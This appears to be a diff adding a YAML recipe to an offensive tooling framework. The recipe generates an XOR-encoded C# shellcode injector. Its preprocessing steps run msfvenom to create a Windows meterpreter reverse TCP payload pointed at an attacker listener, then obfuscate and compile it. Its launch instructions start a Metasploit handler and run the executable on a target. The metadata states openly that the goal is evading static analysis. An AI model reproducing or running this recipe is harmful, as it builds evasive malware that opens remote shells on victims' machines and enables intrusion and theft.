@@ -1,0 +1,105 @@
+meta:
+  name: "XOR-Encoded Shellcode Injector (C#)"
+  category: "Examples"
+  description: |
+    Simple XOR-encoded shellcode injector using C#.
+    Uses single-byte XOR key (0xfa) for basic obfuscation.
+    Similar to the classic XorCoder pattern.
+
+    This is a simpler alternative to AES encryption, useful for
+    evading basic static analysis while maintaining simplicity.
+
+  effectiveness: "medium"
+
+  mitre:
+    tactic: "TA0005 - Defense Evasion"
+    technique: "T1027 - Obfuscated Files or Information"
+
+  artifacts:
+    - "XOR-encoded shellcode in binary"
+    - "Simple decode loop in code"
+    - "VirtualAlloc and CreateThread API calls"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Listener IP address"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Listener port"
+    required: true
+    default: 4444
+
+  - name: "xor_key"
+    type: "hex"
+    description: "XOR key (single byte, e.g., 'fa')"
+    required: false
+    default: "fa"
+
+  - name: "output_file"
+    type: "string"
+    description: "Output executable filename"
+    required: true
+    default: "xor_injector.exe"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory"
+    required: true
+    default: "{config.output_dir}"
+
+preprocessing:
+  # Step 1: Generate shellcode
+  - type: "command"
+    name: "generate_shellcode"
+    command: |
+      msfvenom -p windows/x64/meterpreter_reverse_tcp \
+        LHOST={{ lhost }} LPORT={{ lport }} \
+        EXITFUNC=thread -f raw
+    output_var: "raw_shellcode"
+
+  # Step 2: Base64 encode for processing
+  - type: "script"
+    name: "encode_b64"
+    script: "base64_encode.py"
+    args:
+      data: "{{ raw_shellcode }}"
+    output_var: "shellcode_b64"
+
+  # Step 3: XOR encrypt with fixed key
+  - type: "script"
+    name: "xor_encryption"
+    script: "xor_encrypt.py"
+    args:
+      data: "{{ shellcode_b64 }}"
+      key: "{{ xor_key }}"
+    output_var: "xor_result"
+
+  # Step 4: Format as C# byte array
+  - type: "script"
+    name: "format_payload"
+    script: "format_csharp.py"
+    args:
+      data: "{{ xor_result.encrypted }}"
+      var_name: "buf"
+      bytes_per_line: 15
+    output_var: "csharp_payload"
+
+output:
+  type: "template"
+  template: "examples/xor_injector.cs"
+
+  compile:
+    enabled: true
+    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
+
+  launch_instructions: |
+    Start Metasploit listener
+    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+
+    Execute on target
+    {{ output_file }}
+
+    Note: Payload is XOR-encoded with key 0x{{ xor_key }}
